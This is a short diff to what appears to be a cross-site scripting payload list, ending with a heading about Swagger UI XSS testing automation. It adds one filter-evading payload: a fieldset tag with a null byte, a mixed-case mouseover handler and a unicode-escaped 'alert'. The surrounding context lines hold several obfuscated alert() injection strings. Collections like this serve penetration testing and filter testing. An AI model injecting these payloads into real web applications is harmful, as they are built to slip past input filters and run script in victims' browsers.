@@ -35,6 +35,7 @@ top[8680439..toString(30)](7);
 top[/al/.source+/ert/.source](8);
 top[‘al\x65rt’](9);
 foo%27-top[%27al\x65rt%27](document.domain);//
+<fieldset//%00//onsite OnMoUsEoVeR=\u0061\u006C\u0065\u0072\u0074`/AAAA/`>
 ```
 > Swagger UI XSS Testing Automation
 ```
